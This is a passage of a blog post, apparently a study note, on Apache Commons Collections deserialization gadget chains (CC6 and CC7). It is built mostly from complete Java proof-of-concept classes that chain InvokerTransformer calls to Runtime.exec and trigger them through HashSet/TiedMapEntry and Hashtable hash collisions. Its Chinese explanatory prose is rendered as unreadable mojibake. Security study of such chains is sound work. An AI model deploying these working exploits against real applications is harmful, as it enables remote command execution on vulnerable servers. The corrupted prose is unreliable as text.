org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6EzbyBAIPAO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet();<br>        hs.add(tiedMapEntry);<br><br>        decorate.remove(<span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-comment">//        decorate.clear();</span><br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>‰ΩÜËøô‰∏™ÈìæÂíå yso ÁöÑËøòÊòØÊúâ‰∏ÄÂÆöÁöÑÂ∑ÆË∑ùÁöÑÔºåËøô‰∏™ÈìæÂæÄ<code>LazyMap-&gt;TiedMapEntry-&gt;HashSet</code>Ê∑ªÂä†ÂÅáÈìæÂêéÂèçÂ∞Ñ‰øÆÊîπÔºåÊÄùË∑ØÁÆÄÂçï</p>
<h4 id="‚ë¢yso"><a href="#‚ë¢yso" class="headerlink" title="‚ë¢yso"></a>‚ë¢yso</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<span class="hljs-comment">//ÂøÖÈ°ªÂæóËÆæÁΩÆÂÄº1 ÂêéÁª≠ÊâçËÉΩÂèñÂÄºmap</span><br>        hs.add(<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field mapF = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        mapF.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hm_tmp = (HashMap) mapF.get(hs);<br><br>        Field tableF = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] arr = (Object[]) tableF.get(hm_tmp);<br><br>        Object node = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-keyword">null</span>) &#123;<br>            node = arr[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        Field keyF = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(node, tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>È¶ñÂÖàÊòØ new ‰∫Ü‰∏Ä‰∏™‰∏∫ 1 ÁöÑÂàùÂåñÂÆπÈáèÔºåÂä†‰∫Ü‰∏Ä‰∏™Êó†ÂÖ≥Á¥ßË¶ÅÁöÑÈîÆÔºåÈÄöËøáÂèçÂ∞ÑÂèñÂá∫<code>map(HashMap)</code>ÔºåÂÜçÂèçÂ∞ÑÂèñÂá∫ Âú®ÂèçÂ∞ÑÂèñÂá∫ÁöÑ<code>map</code>ÈáåÈù¢ÁöÑ<code>table</code>Âπ∂ÁΩÆ‰∫é‰∏Ä‰∏™ object Êï∞ÁªÑÔºåÊï∞ÁªÑÂÅö‰∏Ä‰∏™Âà§Êñ≠ÔºåÂèñÂá∫ÈùûÁ©∫ÁöÑ[0]Êàñ[1]ÂÖÉÁ¥†</p>
<p>ÈÄöËøáÂèçÂ∞ÑÊúÄÂêéÂ∞ÜÊ∑ªÂä†ÁöÑÊó†ÂÖ≥Á¥ßË¶ÅÁöÑÂÖÉÁ¥†ÊõøÊç¢‰∏∫ evil Èìæ</p>
<p>ÊúâÁÇπÈöæ‚Ä¶</p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#72fa7c88-6">https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#72fa7c88-6</a></p>
<h2 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h2><h3 id="Pre-6"><a href="#Pre-6" class="headerlink" title="Pre"></a>Pre</h3><h4 id="ÈôêÂà∂-6"><a href="#ÈôêÂà∂-6" class="headerlink" title="ÈôêÂà∂"></a>ÈôêÂà∂</h4><blockquote>
<p>jdk ÊöÇÊó†ÈôêÂà∂</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="Âà©Áî®Èìæ-6"><a href="#Âà©Áî®Èìæ-6" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.readObject</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.reconstitutionPut</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.AbstractMapDecorator</span><span class="hljs-selector-class">.equals</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.AbstractMap</span><span class="hljs-selector-class">.equals</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span><span class="hljs-selector-class">.get</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.ChainedTransformer</span><span class="hljs-selector-class">.transform</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span>.exec<br></code></pre></td></tr></table></figure>

<h4 id="ÂÖ≥ÈîÆÁ±ª-6"><a href="#ÂÖ≥ÈîÆÁ±ª-6" class="headerlink" title="ÂÖ≥ÈîÆÁ±ª"></a>ÂÖ≥ÈîÆÁ±ª</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">HashTable</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure>

<p>ÂÖà‰∏çËØ¥ÂÖ∑‰ΩìÁöÑÈìæÔºåÂú®Ëøô‰∏™ÈìæÁöÑÂú∞ÊñπÂèëÁé∞‰∏Ä‰∏™ÂæàÊúâË∂£ÁöÑ‰∏úË•øÔºåÂÖàÊãøÂá∫Êù•ËÆ≤Ôºå‰ΩúÁü•ËØÜÈì∫Âû´</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hash</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;yy&quot;</span>.hashCode());<br>        System.out.println(<span class="hljs-string">&quot;zZ&quot;</span>.hashCode());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Ëøô‰∏™‰∏úË•øÂè´<a target="_blank" rel="noopener" href="https://www.h5w3.com/164057.html">hash ÂÜ≤Á™Å</a>ÔºåÊàë‰ª¨Áúã‰∏ã‰ª£Á†Å<code>String#hashCode</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h = hash;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-number">0</span> &amp;&amp; value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">char</span> val[] = value;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; value.length; i++) &#123;<br>            h = <span class="hljs-number">31</span> * h + val[i];<br>        &#125;<br>        hash = h;<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÂèØËßÅÊòØÂ∞Ü String ÂàÜ‰∏∫Â≠óÁ¨¶‰∏Ä‰Ωç‰∏Ä‰ΩçÊ†πÊçÆ<strong>ASCII</strong>ÂÅö‰∏Ä‰∏™ËøêÁÆó</p>
<blockquote>
<p>yyÔºöÁ¨¨‰∏ÄÊ¨° y ÁöÑ ascii121ÔºåÁ¨¨‰∫åÊ¨° 31*121+121=3872</p>
<p>zZÔºöÁ¨¨‰∏ÄÊ¨° z ÁöÑ ascii122ÔºåÁ¨¨‰∫åÊ¨° 31*122+90=3872</p>
</blockquote>
<p>ËøòÊúâÂÖ∂‰ªñÁöÑÔºö</p>
<blockquote>
<p>CC == Bb<br>DD == Cc<br>BBBB == BBAa</p>
</blockquote>
<p>CC7 ÂâçÂçäÊÆµ‰ªçÁÑ∂ÊòØÁî®ÁöÑ CC1 ÁöÑÈìæÔºåCC1 ‰∏≠ÊòØÈÄöËøá<code>AnnotationInvocationHandler.invoke</code>Êù•Ëß¶ÂèëÂØπÊÅ∂ÊÑè‰ª£ÁêÜ<code>handler</code>Ë∞ÉÁî®ÂÖ∂<code>invoke</code>ÊñπÊ≥ï‰ªéËÄåËß¶Âèë<code>LazyMap.get</code>ÊñπÊ≥ïÔºåCC7 ÂàôÊòØÈÄöËøá<code>AbstractMap.equals</code>Êù•Ëß¶ÂèëÂØπ<code>LazyMap.get</code>ÊñπÊ≥ïÁöÑË∞ÉÁî®</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!value.equals(m.get(key)))<br></code></pre></td></tr></table></figure>

<p>ËøôÈáå m ËÆæÁΩÆ‰∏∫<code>LazyMap</code>Âç≥ÂèØ RCE</p>
<p>Ëøõ‰∏ÄÊ≠•Âú∞‰ΩøÁî®‰∫Ü<code>HashTable</code>‰Ωú‰∏∫Â§çÂÜôÁÇπÔºåË∞ÉÁî®‰∫Ü<code>HashTable.reconstitutionPut</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br></code></pre></td></tr></table></figure>

<p>ÂØπÂ∫îÂà∞<code>writeObject</code>ÂèØÁü•Ôºå<code>HashTable.put</code>ÈîÆÂÄº</p>
<p>Ëøô‰∏™‰∏ç‰ºöÂÜôÔºåÁõ¥Êé•Ë¥¥Âá∫Êù•</p>
<h3 id="Gadget-6"><a href="#Gadget-6" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC7;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC7</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        Map map1 = LazyMap.decorate(<span class="hljs-keyword">new</span> HashMap(), fakechainedTransformer);<br>        Map map2 = LazyMap.decorate(<span class="hljs-keyword">new</span> HashMap(), fakechainedTransformer);<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">2</span>);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">2</span>);<br><br>        Hashtable ht = <span class="hljs-keyword">new</span> Hashtable();<br>        ht.put(map1, <span class="hljs-number">2</span>);<br>        ht.put(map2, <span class="hljs-number">2</span>);<br>        map2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer, transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(ht);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>‰∏Ä‰∫õÁªÜËäÇÔºö</p>
<p><code>AbstractMap</code>ÊòØ<code>HashMap</code>ÁöÑÁà∂Á±ªÔºåÂõ†Ê≠§Âú®<code>HashTable.reconstitutionPut</code>Ë∞ÉÁî®<code>LazyMap.equals</code>Âç≥ÂèØ</p>
<p>Á¨¨‰∫å‰∏™Âæó<code>HashTable.put</code>‰∏§Ê¨°Ôºå‰∏çÁÑ∂Âú®Â§çÂÜôÁÇπËµ∞Ëøõ<code>reconstitutionPut</code>‰∏ç‰ºöËøõÂÖ• for</p>
<p><code>Hashtable.put</code>ÊñπÊ≥ïÊñ∞Â¢ûÁöÑÂÖÉÁ¥†ÔºåÊòØÂ≠òÂÇ®Âú®<code>Hashtable$Entry</code>Ëøô‰∏™ÂÜÖÈÉ®Á±ªÈáåÈù¢ÁöÑÔºåÈÇ£‰πàËé∑ÂèñÂÖÉÁ¥†‰πüÊòØÂú®Ëøô‰∏™ÂÜÖÈÉ®Á±ªËé∑ÂèñÁöÑ</p>
<p><code>LazyMap.put</code>ÊñπÊ≥ïÊñ∞Â¢ûÁöÑÂÖÉÁ¥†ÔºåÊòØË∞ÉÁî®<code>LazyMap.map.put</code>ÊñπÊ≥ïÊñ∞Â¢ûÁöÑÔºåÂΩì<code>map</code>Â±ûÊÄß‰∏∫<code>HashMap</code>ÂØπË±°ÁöÑÊó∂ÂÄôÔºåÊñ∞Â¢ûÁöÑÂÖÉÁ¥†ÊòØÂ≠òÂÇ®Âú®<code>HashMap$Node</code>ÂÜÖÈÉ®Á±ªÈáåÈù¢ÁöÑÔºåÊ≥®ÊÑè<code>LazyMap</code>Á±ªÊ≤°Êúâ put ÊñπÊ≥ïÔºåË∞ÉÁî®ÁöÑÊòØÂÖ∂Áà∂Á±ªÁöÑ put ÊñπÊ≥ï</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> StreamCorruptedException</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>    &#125;<br>    <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>    <span class="hljs-comment">// This should not happen in deserialized version.</span><br>    <span class="hljs-keyword">int</span> hash = key.hashCode();<br>    <span class="hljs-keyword">int</span> index = (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>    <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-keyword">null</span> ; e = e.next) &#123;<br>        <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// Creates the new entry.</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>    tab[index] = <span class="hljs-keyword">new</span> Entry&lt;&gt;(hash, key, value, e);<br>    count++;<br>&#125;<br></code></pre></td></tr></table></figure>

